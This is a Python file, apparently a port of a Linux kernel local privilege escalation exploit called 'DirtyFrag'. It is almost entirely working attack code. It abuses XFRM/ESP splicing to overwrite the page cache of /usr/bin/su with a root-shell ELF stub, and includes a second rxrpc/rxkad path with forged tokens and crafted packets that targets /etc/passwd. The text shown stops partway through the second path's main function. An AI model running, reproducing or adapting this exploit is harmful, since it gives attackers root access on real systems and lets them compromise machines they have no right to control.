#!/usr/bin/env python3
"""
DirtyFrag LPE – Full Python3 port (su + rxrpc chains).
Exploits kernel vulnerabilities to gain root.
Updated by ClumsyLulz 
My Repo https://github.com/SleepTheGod/dirtyfrag
original code: https://github.com/V4bel/dirtyfrag/blob/master/exp.c

Usage:
  python3 dirtyfrag.py [--force-esp] [--force-rxrpc] [--corrupt-only]
                      [--verbose] [--help]

Options:
  --force-esp        Use only the su page‑cache overwrite (ESP path).
  --force-rxrpc      Use only the /etc/passwd corruption (rxrpc path).
  --corrupt-only     Stop after corrupting the target; do not spawn a shell.
  --verbose, -v      Enable verbose output.
  --help, -h         Show this help message and exit.
"""
import os, sys, time, struct, ctypes, socket, mmap, select, termios, pty, signal
from ctypes import c_int, c_char_p, c_size_t, c_longlong, c_uint, POINTER, CDLL, byref, pointer

# Load libc
libc = CDLL(None, use_errno=True)
libc.unshare.argtypes = [c_int]
libc.splice.argtypes = [c_int, POINTER(c_longlong), c_int, POINTER(c_longlong), c_size_t, c_uint]
libc.splice.restype = c_longlong
libc.vmsplice.argtypes = [c_int, POINTER(ctypes.c_iovec), c_size_t, c_uint]
libc.vmsplice.restype = c_longlong

# --- iovec structure for vmsplice ---
class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]

# --- Constants ---
CLONE_NEWUSER = 0x10000000
CLONE_NEWNET  = 0x40000000
AF_NETLINK    = 16
NETLINK_XFRM  = 6
AF_RXRPC      = 33
SOL_RXRPC     = 272
SOL_UDP       = 17
UDP_ENCAP     = 100
UDP_ENCAP_ESPINUDP = 2
IPPROTO_ESP   = 50
XFRM_MSG_NEWSA = 16
NLM_F_REQUEST = 1
NLM_F_ACK     = 4
XFRMA_ALG_AUTH_TRUNC = 11
XFRMA_ALG_CRYPT = 12
XFRMA_ENCAP   = 9
XFRMA_REPLAY_ESN_VAL = 14
XFRM_MODE_TRANSPORT = 0
XFRM_STATE_ESN = 1
RXRPC_SECURITY_KEY = 2
RXRPC_MIN_SECURITY_LEVEL = 6
RXRPC_SECURITY_AUTH = 2
RXRPC_USER_CALL_ID = 1
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_DATA = 1
RXRPC_LAST_PACKET = 0x04

# ==================== HELPER: write to /proc files ====================
def write_file(path, data):
    try:
        with open(path, "w") as f:
            f.write(data)
    except:
        pass

# ==================== XFRM SA netlink helpers ====================
def _align(n):
    return (n + 3) & ~3

def put_attr(nlh, attr_type, data):
    rta = struct.pack("=HH", len(data) + 4, attr_type) + data
    nlh["payload"] += rta
    nlh["len"] += len(rta)

def build_xfrm_sa_req(spi, patch_seqhi):
    nlh = {"type": XFRM_MSG_NEWSA, "flags": NLM_F_REQUEST | NLM_F_ACK,
           "seq": 1, "pid": os.getpid(), "len": 16, "payload": b""}

    # xfrm_usersa_info (224 bytes)
    sel = struct.pack("=4s4sHH",                      # daddr, saddr, prefixlen_d, prefixlen_s
                      socket.inet_pton(socket.AF_INET, "127.0.0.1"),
                      socket.inet_pton(socket.AF_INET, "127.0.0.1"),
                      32, 32)
    sel += b"\x00" * (56 - len(sel))                  # pad to 56 bytes
    id_part = struct.pack("=4sI4s",
                          socket.inet_pton(socket.AF_INET, "127.0.0.1"),
                          socket.htonl(spi),
                          socket.inet_pton(socket.AF_INET, "0.0.0.0"))
    id_part = id_part[:8] + struct.pack("=B3x", IPPROTO_ESP)
    saddr = socket.inet_pton(socket.AF_INET, "127.0.0.1")
    lft = b"\xff" * 48
    curlft = b"\x00" * 48
    info = sel + id_part + saddr + lft + curlft
    info += struct.pack("=III", 0, 0, 0x1234)          # stats, seq, reqid
    info += struct.pack("=HBBBB", socket.AF_INET, XFRM_MODE_TRANSPORT, 0, XFRM_STATE_ESN, 0)  # family, mode, replay_window, flags, __pad1
    info += b"\x00" * (224 - len(info))
    nlh["payload"] = info
    nlh["len"] += len(info)

    # Auth
    auth_name = b"hmac(sha256)" + b"\x00" * (64 - len(b"hmac(sha256)"))
    auth = struct.pack("=64sHH", auth_name, 256, 128) + b"\xAA" * 32
    put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, auth)

    # Crypt
    crypt_name = b"cbc(aes)" + b"\x00" * (64 - len(b"cbc(aes)"))
    crypt = struct.pack("=64sH", crypt_name, 128) + b"\xBB" * 16
    put_attr(nlh, XFRMA_ALG_CRYPT, crypt)

    # Encapsulation
    enc = struct.pack("=HHH4s", UDP_ENCAP_ESPINUDP, socket.htons(4500), socket.htons(4500), b"\x00"*4)
    put_attr(nlh, XFRMA_ENCAP, enc)

    # Extended Sequence Numbers
    esn = struct.pack("=IIIQQI", 1, 0, 100, 0, patch_seqhi, 32)
    put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn)

    return nlh

def send_xfrm_sa(nlh):
    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sock.bind((0, 0))
    header = struct.pack("=IHHII", nlh["len"], nlh["type"], nlh["flags"], nlh["seq"], nlh["pid"])
    sock.send(header + nlh["payload"])
    data = sock.recv(4096)
    sock.close()
    if len(data) < 16:
        return False
    nlhdr = struct.unpack("=IHHII", data[:16])
    if nlhdr[2] & 2:  # NLM_F_ERROR
        err = struct.unpack("=i", data[16:20])[0]
        return err == 0
    return True

# ==================== SU overwrite via ESP splice ====================
SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

def do_one_su_write(path, offset, spi):
    # Receiver (ESPinUDP)
    sk_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_recv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_recv.bind(("127.0.0.1", 4500))
    sk_recv.setsockopt(socket.IPPROTO_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)

    # Sender
    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_send.connect(("127.0.0.1", 4500))

    fd = os.open(path, os.O_RDONLY)
    if fd < 0:
        return -1

    # ESP header: SPI, SEQ=200, 16 bytes dummy IV
    hdr = struct.pack("!II16s", spi, 200, b"\xCC" * 16)

    p = os.pipe()
    iov_struct = iovec(ctypes.cast(ctypes.c_char_p(hdr), ctypes.c_void_p), len(hdr))
    iov_array = (iovec * 1)(iov_struct)
    if libc.vmsplice(p[1], iov_array, 1, 0) != len(hdr):
        os.close(fd); os.close(p[0]); os.close(p[1]); sk_send.close(); sk_recv.close()
        return -1

    off = ctypes.c_longlong(offset)
    # Splice 16 bytes from file to pipe (SPLICE_F_MOVE = 0x01)
    if libc.splice(fd, byref(off), p[1], None, 16, 0x01) != 16:
        os.close(fd); os.close(p[0]); os.close(p[1]); sk_send.close(); sk_recv.close()
        return -1

    # Splice pipe to socket (24 header + 16 data)
    if libc.splice(p[0], None, sk_send.fileno(), None, 40, 0x01) != 40:
        pass  # proceed even if splice fails, as kernel may have already decrypted

    time.sleep(0.15)
    os.close(fd); os.close(p[0]); os.close(p[1])
    sk_send.close(); sk_recv.close()
    return 0

def su_lpe_main():
    # Create user+network namespace
    if libc.unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0:
        print("[!] unshare failed"); return False
    uid = os.getuid(); gid = os.getgid()
    write_file("/proc/self/setgroups", "deny")
    write_file("/proc/self/uid_map", f"0 {uid} 1")
    write_file("/proc/self/gid_map", f"0 {gid} 1")

    # Bring up lo
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack("16si", b"lo", 0)
    s.ioctl(socket.SIOCGIFFLAGS, ifreq)
    ifr = struct.unpack("16si", ifreq)
    flags = ifr[1] | 0x1 | 0x40  # IFF_UP | IFF_RUNNING
    s.ioctl(socket.SIOCSIFFLAGS, struct.pack("16si", b"lo", flags))
    s.close()

    # Install XFRM SAs
    for i in range(len(SHELL_ELF) // 4):
        spi = 0xDEADBE10 + i
        word = (SHELL_ELF[i*4] << 24) | (SHELL_ELF[i*4+1] << 16) | (SHELL_ELF[i*4+2] << 8) | SHELL_ELF[i*4+3]
        nlh = build_xfrm_sa_req(spi, word)
        if not send_xfrm_sa(nlh):
            print(f"[!] XFRM SA #{i} failed")
            return False

    # Overwrite /usr/bin/su page cache
    for i in range(len(SHELL_ELF) // 4):
        if do_one_su_write("/usr/bin/su", i*4, 0xDEADBE10 + i) != 0:
            print(f"[!] write #{i} failed")
            return False

    print("[+] /usr/bin/su page-cache patched")
    return True

# ==================== RXRPC/RXKAD attack ====================
# Complete fcrypt S-boxes (from kernel sources)
FC_SBOX0 = bytes([
    0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86, 0x91, 0x0a, 0xb2, 0x93, 0x06,
    0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5, 0x38, 0x7e, 0xda, 0x9f, 0xe3,
    0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa, 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
    0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66, 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
    0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec, 0xda, 0x9f, 0x26, 0x76, 0x15,
    0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d, 0xd3, 0x04, 0x49, 0xaa, 0x24,
    0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01, 0xd8, 0x70, 0x64, 0xf0, 0x51,
    0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7, 0xc6, 0x61, 0x03, 0xeb, 0x44,
    0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e, 0x33, 0xab, 0x93, 0xa2, 0xb7,
    0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e, 0x2e, 0x62, 0x03, 0xc8, 0xe0,
    0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65, 0x60, 0x69, 0xb6, 0xf6, 0xe6,
    0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd, 0x63, 0x19, 0x74, 0x61, 0xb1,
    0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1, 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
    0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa, 0x26, 0x49, 0xe0, 0x21, 0x64,
    0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6, 0xb9, 0xf1, 0x24, 0x75, 0x03,
    0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6, 0xba, 0x0c, 0x0d, 0x42, 0x2e,
])
FC_SBOX1 = bytes([
    0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1, 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
    0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03, 0xb7, 0x73, 0xe6, 0xe1, 0x39,
    0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98, 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
    0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95, 0xca, 0x76, 0x44, 0xcd, 0xb6,
    0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31, 0x8a, 0x23, 0x17, 0x04, 0xfa,
    0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60, 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
    0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d, 0x97, 0x7a, 0x18, 0x60, 0x3d,
    0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08, 0x15, 0x1b, 0x88, 0x6a, 0x17,
    0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68, 0xc8, 0xd3, 0x84, 0x28, 0x0a,
    0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88, 0x94, 0x5e, 0x9c, 0x63, 0xd5,
    0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0, 0x8f, 0x23, 0x3c, 0x12, 0x52,
    0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d, 0xd3, 0xf7, 0x28, 0xf8, 0x30,
    0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd, 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
    0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81, 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
    0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34, 0xd6, 0x43, 0xdf, 0xe4, 0x78,
    0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0, 0x2f, 0x96, 0x91, 0x82, 0x80,
])
FC_SBOX2 = bytes([
    0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50, 0xf0, 0x42, 0x78, 0x2f, 0x6d,
    0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb, 0xb4, 0x65, 0x6e, 0xe7, 0x24,
    0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7, 0xd9, 0x45, 0x20, 0x1b, 0xce,
    0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6, 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
    0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07, 0xb8, 0x95, 0x02, 0xc0, 0xd0,
    0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3, 0x8d, 0xfb, 0xed, 0xda, 0x1d,
    0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe, 0x29, 0xeb, 0x12, 0x19, 0x34,
    0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a, 0xa5, 0x32, 0x12, 0x7b, 0xdc,
    0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f, 0x73, 0xd3, 0x14, 0x48, 0x40,
    0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac, 0x24, 0x94, 0x4a, 0x18, 0x15,
    0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea, 0xde, 0x0c, 0x79, 0x2a, 0x99,
    0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd, 0x62, 0x47, 0xb3, 0x21, 0x8a,
    0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e, 0x04, 0x85, 0xd8, 0xbc, 0x1f,
    0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde, 0xae, 0x37, 0x49, 0xb7, 0xfa,
    0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5, 0xe0, 0x44, 0x78, 0x84, 0x59,
    0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73, 0x80, 0x76, 0xb4, 0x10, 0x86,
])
FC_SBOX3 = bytes([
    0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42, 0x33, 0x7d, 0x5d, 0xa6, 0x12,
    0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d, 0x72, 0xf0, 0x92, 0x5a, 0x1b,
    0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5, 0x41, 0x97, 0x41, 0x31, 0x82,
    0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2, 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
    0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29, 0x43, 0x01, 0x54, 0x70, 0xa4,
    0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68, 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
    0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c, 0x6e, 0x35, 0xdc, 0x60, 0x65,
    0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe, 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
    0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00, 0x75, 0xba, 0x8f, 0x76, 0x5f,
    0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01, 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
    0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59, 0x89, 0xa5, 0x31, 0xcf, 0x05,
    0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1, 0x3b, 0x18, 0x12, 0x17, 0xb0,
    0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0, 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
    0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54, 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
    0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95, 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
    0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5, 0xe3, 0xba, 0xfc, 0x0e, 0x25,
])

# Pre-compute S‑boxes in big‑endian uint32 format (as used by kernel)
def build_sboxes():
    s0 = [0]*256; s1 = [0]*256; s2 = [0]*256; s3 = [0]*256
    for i in range(256):
        s0[i] = struct.unpack(">I", struct.pack(">I", FC_SBOX0[i] << 3))[0]
        s1[i] = struct.unpack(">I", struct.pack(">I",
                      ((FC_SBOX1[i] & 0x1f) << 27) | (FC_SBOX1[i] >> 5)))[0]
        s2[i] = struct.unpack(">I", struct.pack(">I", FC_SBOX2[i] << 11))[0]
        s3[i] = struct.unpack(">I", struct.pack(">I", FC_SBOX3[i] << 19))[0]
    return s0, s1, s2, s3

sbox0, sbox1, sbox2, sbox3 = build_sboxes()

def fcrypt_setkey(key):
    k = 0
    for b in key:
        k = (k << 7) | (b >> 1)
    sched = [0]*16
    for i in range(16):
        sched[i] = k & 0xFFFFFFFF
        k = (k >> 11) | ((k & ((1<<11)-1)) << (56-11))
    return sched

def fcrypt_encrypt_block(sched, blk):
    L = struct.unpack("<I", blk[0:4])[0]
    R = struct.unpack("<I", blk[4:8])[0]
    for i in range(16):
        u = (sched[i] ^ R).to_bytes(4, 'little')
        L = L ^ (sbox0[u[0]] ^ sbox1[u[1]] ^ sbox2[u[2]] ^ sbox3[u[3]])
        L, R = R, L
    return struct.pack("<II", R, L)

def fcrypt_decrypt_block(sched, blk):
    L = struct.unpack("<I", blk[0:4])[0]
    R = struct.unpack("<I", blk[4:8])[0]
    for i in range(15, -1, -1):
        u = (sched[i] ^ R).to_bytes(4, 'little')
        L = L ^ (sbox0[u[0]] ^ sbox1[u[1]] ^ sbox2[u[2]] ^ sbox3[u[3]])
        L, R = R, L
    return struct.pack("<II", R, L)

def pcbc_encrypt(sched, iv, data):
    out = b""
    prev = iv
    for i in range(0, len(data), 8):
        blk = data[i:i+8]
        xored = bytes(a ^ b for a,b in zip(blk, prev))
        enc = fcrypt_encrypt_block(sched, xored)
        out += enc
        prev = bytes(a ^ b for a,b in zip(enc, blk))
    return out

def compute_csum_iv(epoch, cid, sec_ix, key):
    sched = fcrypt_setkey(key)
    plain = struct.pack(">III", epoch, cid, sec_ix) + b'\x00'*4
    enc = pcbc_encrypt(sched, key, plain)
    return enc[8:16]

def compute_cksum(cid, call_id, seq, key, csum_iv):
    sched = fcrypt_setkey(key)
    x = (cid & 3) << (32-2) | (seq & 0x3fffffff)
    plain = struct.pack(">II", call_id, x)
    enc = pcbc_encrypt(sched, csum_iv, plain)
    y = struct.unpack(">I", enc[4:8])[0]
    cksum = (y >> 16) & 0xFFFF
    return cksum if cksum else 1

# rxrpc token builder (rxkad v1)
def build_rxkad_token(session_key):
    now = int(time.time())
    expires = now + 86400
    cell = b"evil"
    token = b""
    token += struct.pack(">I", 0)           # flags
    token += struct.pack(">I", len(cell))
    token += cell + b"\x00" * ((4 - len(cell) % 4) % 4)
    token += struct.pack(">I", 1)           # ntoken
    toklen_pos = len(token)
    token += b"\x00\x00\x00\x00"           # placeholder for token length
    tokstart = len(token)
    token += struct.pack(">I", 2)           # sec_ix RXKAD
    token += struct.pack(">I", 0)           # vice_id
    token += struct.pack(">I", 1)           # kvno
    token += session_key                    # 8 bytes
    token += struct.pack(">I", now)
    token += struct.pack(">I", expires)
    token += struct.pack(">I", 1)           # primary_flag
    token += struct.pack(">I", 8)           # ticket_len
    token += b"\xCC" * 8
    toklen = len(token) - tokstart
    token = token[:toklen_pos] + struct.pack(">I", toklen) + token[toklen_pos+4:]
    return token

def add_rxrpc_key(keyname, session_key):
    token = build_rxkad_token(session_key)
    # add_key syscall (nr 248)
    SYS_add_key = 248
    try:
        res = libc.syscall(SYS_add_key,
                           ctypes.c_char_p(b"rxrpc"),
                           ctypes.c_char_p(keyname.encode()),
                           token, len(token),
                           -5)  # KEY_SPEC_PROCESS_KEYRING
        return res
    except:
        return -1

# Trigger one kernel decrypt using rxrpc
def do_rxrpc_trigger(target_fd, splice_off, key, call_seq):
    # Varying ports to avoid conflicts
    port_srv = 7777 + (call_seq * 2 % 200)
    port_cli = port_srv + 1

    # Add key
    keyname = f"evil{call_seq}"
    add_rxrpc_key(keyname, key)

    # Create AF_RXRPC client socket
    try:
        rx = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, 0)
    except OSError as e:
        return False
    # Set security key
    rx.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY, keyname.encode())
    rx.setsockopt(SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, struct.pack("=i", RXRPC_SECURITY_AUTH))
    # Bind to localhost
    srx = struct.pack("=HHH4sH",
                      AF_RXRPC, 0, 1,                     # family, service, transport_type (SOCK_DGRAM)
                      socket.inet_pton(socket.AF_INET, "127.0.0.1"),
                      socket.htons(port_cli))
    rx.bind(srx)

    # Initiate call
    call_id = 0xDEAD
    msg = [b"PING"]
    ancillary = [(SOL_RXRPC, RXRPC_USER_CALL_ID, struct.pack("=Q", call_id))]
    try:
        rx.sendmsg(msg, ancillary, 0, ("127.0.0.1", port_srv))
    except BlockingIOError:
        pass

    # Fake UDP server
    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv.bind(("127.0.0.1", port_srv))
    srv.settimeout(2)
    try:
        data, addr = srv.recvfrom(2048)
    except socket.timeout:
        rx.close(); srv.close(); return False
    if len(data) < 24:
        rx.close(); srv.close(); return False
    # Parse rxrpc header
    whdr = data[:24]
    epoch = struct.unpack(">I", whdr[0:4])[0]
    cid = struct.unpack(">I", whdr[4:8])[0]
    callN = struct.unpack(">I", whdr[8:12])[0]
    svc = struct.unpack(">H", whdr[20:22])[0]

    # Send CHALLENGE
    chal = struct.pack(">I", epoch)
    chal += struct.pack(">I", cid)
    chal += struct.pack(">II", 0, 0)          # callNumber=0, seq=0
    chal += struct.pack(">I", 0x10000)         # serial
    chal += struct.pack(">BBBB", RXRPC_PACKET_TYPE_CHALLENGE, 0, 0, 2)  # type, flags, userStatus, secIndex
    chal += struct.pack(">H", 0)              # cksum
    chal += struct.pack(">H", svc)
    # rxkad_challenge
    chal += struct.pack(">I", 2)               # version
    chal += struct.pack(">I", 0xDEADBEEF)      # nonce
    chal += struct.pack(">I", 1)               # min_level
    chal += b"\x00" * 4                        # padding
    srv.sendto(chal, addr)

    # Drain response packets (best effort)
    try:
        while True:
            srv.settimeout(0.2)
            data, _ = srv.recvfrom(2048)
    except socket.timeout:
        pass

    # Compute checksums
    csum_iv = compute_csum_iv(epoch, cid, 2, key)
    cksum = compute_cksum(cid, callN, 1, key, csum_iv)

    # Build malicious DATA header
    mal = struct.pack(">I", epoch)
    mal += struct.pack(">I", cid)
    mal += struct.pack(">I", callN)
    mal += struct.pack(">I", 1)                # seq
    mal += struct.pack(">I", 0x42000)          # serial
    mal += struct.pack(">BBBB", RXRPC_PACKET_TYPE_DATA, RXRPC_LAST_PACKET, 0, 2)
    mal += struct.pack(">H", cksum)
    mal += struct.pack(">H", svc)

    # Connect UDP socket to client
    srv.connect(("127.0.0.1", port_cli))

    # Pipe trick: vmsplice header + splice file data -> send to client
    p = os.pipe()
    iov = iovec(ctypes.cast(ctypes.c_char_p(mal), ctypes.c_void_p), len(mal))
    iov_arr = (iovec * 1)(iov)
    if libc.vmsplice(p[1], iov_arr, 1, 0) != len(mal):
        os.close(p[0]); os.close(p[1]); rx.close(); srv.close(); return False
    off = ctypes.c_longlong(splice_off)
    if libc.splice(target_fd, byref(off), p[1], None, 8, 0x01) != 8:
        os.close(p[0]); os.close(p[1]); rx.close(); srv.close(); return False
    if libc.splice(p[0], None, srv.fileno(), None, len(mal)+8, 0x01) < 0:
        pass

    # Trigger receive on rxrpc socket (will call verify_packet)
    rx.setblocking(False)
    try:
        rx.recvmsg(2048)
    except:
        pass

    os.close(p[0]); os.close(p[1])
    rx.close(); srv.close()
    return True

def rxrpc_lpe_main():
    # Enter new user+net namespace
    if libc.unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0:
        return False
    uid = os.getuid(); gid = os.getgid()
    write_file("/proc/self/setgroups", "deny")
    write_file("/proc/self/uid_map", f"0 {uid} 1")
